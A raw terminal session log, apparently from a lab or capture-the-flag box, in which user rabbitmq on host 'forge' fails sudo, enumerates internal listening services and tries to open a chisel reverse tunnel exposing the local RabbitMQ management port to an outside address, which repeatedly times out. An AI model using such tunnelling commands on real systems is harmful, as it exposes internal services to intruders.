+[K[sudo] password for rabbitmq: [K[sudo] password for rabbitmq: [K[?2004h[sudo] password for rabbitmq: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[Ksudo: 3 incorrect password attempts
+[Krabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ sudo lsof -i :15672./chisel server --port 15672[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./chisel server --port 15672
+[K./chisel server --port 15672
+[K2025/02/23 16:49:02 server: Fingerprint Yk6glVfwzayXmKcqJDgel05QJOsctCjNDSAVgOBMV24=
+2025/02/23 16:49:02 listen tcp 0.0.0.0:15672: bind: address already in use
+rabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ [7mss -tlnp[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hss -tlnp
+[Kss -tlnp
+[KState  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                             
+LISTEN 0      128        127.0.0.1:8000       0.0.0.0:*                                       
+LISTEN 0      128        127.0.0.1:5672       0.0.0.0:*    users:(("beam.smp",pid=1142,fd=35))
+LISTEN 0      1024       127.0.0.1:15672      0.0.0.0:*    users:(("beam.smp",pid=1142,fd=34))
+LISTEN 0      128          0.0.0.0:25672      0.0.0.0:*    users:(("beam.smp",pid=1142,fd=18))
+LISTEN 0      511        127.0.0.1:3000       0.0.0.0:*                                       
+LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                       
+LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                       
+LISTEN 0      511                *:80               *:*                                       
+LISTEN 0      128             [::]:22            [::]:*                                       
+LISTEN 0      4096               *:4369             *:*                                       
+rabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ ss -tlnp./chisel server --port 15672[K[K[K[K[K8000[K0[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./chisel server --port 8000
+[K./chisel server --port 8000
+[K2025/02/23 16:50:32 server: Fingerprint JSIseMdHFY4mG0IwQ/r/2T4Erqim/xTVVxdJqrOfVDE=
+2025/02/23 16:50:32 listen tcp 0.0.0.0:8000: bind: address already in use
+rabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ [7mchisel client 10.8.61.245:15672 R:8080:localhost:15672[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchisel client 10.8.61.245:15672 R:8080:localhost:15672
+[Kchisel client 10.8.61.245:15672 R:8080:localhost:15672
+[Kchisel: command not found
+rabbitmq@forge:/tmp$ [Krabbitmq@forge:/tmp$ [K[?2004hrabbitmq@forge:/tmp$ chisel client 10.8.61.245:15672 R:8080:localhost:15672[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@.[1@/[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./chisel client 10.8.61.245:15672 R:8080:localhost:15672
+[K./chisel client 10.8.61.245:15672 R:8080:localhost:15672
+[K2025/02/23 16:59:28 client: Connecting to ws://10.8.61.245:15672
+[K2025/02/23 17:00:13 client: Connection error: dial tcp 10.8.61.245:15672: i/o timeout
+2025/02/23 17:00:13 client: Retrying in 100ms...
+[K2025/02/23 17:00:59 client: Connection error: dial tcp 10.8.61.245:15672: i/o timeout (Attempt: 1/unlimited)
+2025/02/23 17:00:59 client: Retrying in 200ms...
+[K2025/02/23 17:01:44 client: Connection error: dial tcp 10.8.61.245:15672: i/o timeout (Attempt: 2/unlimited)
+2025/02/23 17:01:44 client: Retrying in 400ms...
+[K2025/02/23 17:02:29 client: Connection error: dial tcp 10.8.61.245:15672: i/o timeout (Attempt: 3/unlimited)
+2025/02/23 17:02:29 client: Retrying in 800ms...
+[K2025/02/23 17:03:15 client: Connection error: dial tcp 10.8.61.245:15672: i/o timeout (Attempt: 4/unlimited)
+2025/02/23 17:03:15 client: Retrying in 1.6s...
+[K2025/02/23 17:04:02 client: Connection error: dial tcp 10.8.61.245:15672: i/o timeout (Attempt: 5/unlimited)[K[A[K2025/02/23 17:04:02 client: Connection error: dial tcp 10.8.61.245:15672: i/o timeout (Attempt: 5/unlimited)[K[A[K2025/02/23 17:04:02 client: Connection error: dial tcp 10.8.61.245:15672: i/o timeout (Attempt: 5/unlimited)
+2025/02/23 17:04:02 client: Retrying in 3.2s...
+[K2025/02/23 17:04:50 client: Connection error: dial tcp 10.8.61.245:15672: i/o timeout (Attempt: 6/unlimited)
+2025/02/23 17:04:50 client: Retrying in 6.4s...
+[K2025/02/23 17:05:41 client: Connection error: dial tcp 10.8.61.245:15672: i/o timeout (Attempt: 7/unlimited)
+2025/02/23 17:05:41 client: Retrying in 12.8s...
+[K2025/02/23 17:06:39 client: Connection error: dial tcp 10.8.61.245:15672: i/o timeout (Attempt: 8/unlimited)
+2025/02/23 17:06:39 client: Retrying in 25.6s...
+[K
+[?2004l
+Script done on 2025-02-23 20:07:04+03:00 [COMMAND_EXIT_CODE="1"]
